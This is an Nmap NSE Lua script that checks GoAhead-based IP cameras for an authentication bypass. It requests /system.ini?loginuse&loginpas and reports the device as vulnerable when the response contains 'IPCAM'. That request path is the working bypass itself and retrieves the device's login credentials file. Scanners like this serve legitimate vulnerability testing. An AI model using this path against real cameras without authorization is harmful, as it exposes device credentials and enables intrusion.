local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
GoAhead系列
只要访问地址(url)中含有loginuse和loginpas这两个值即攻击者可绕过认证导致信息（登录凭据）泄漏漏洞
]]

author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"goahead_unauth_01"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	-- stdnse.verbose("[*] Starting check vulnreable.")

	local path = "/system.ini?loginuse&loginpas"

	local output = stdnse.output_table()

	local response = http.get(host, port, path)
	
	if response.status == 200 and string.find(response.body, "IPCAM") ~= nil then
		output = "Found vulnerable."
	else
		output = "Not vulnerable."
	end
	return output
end

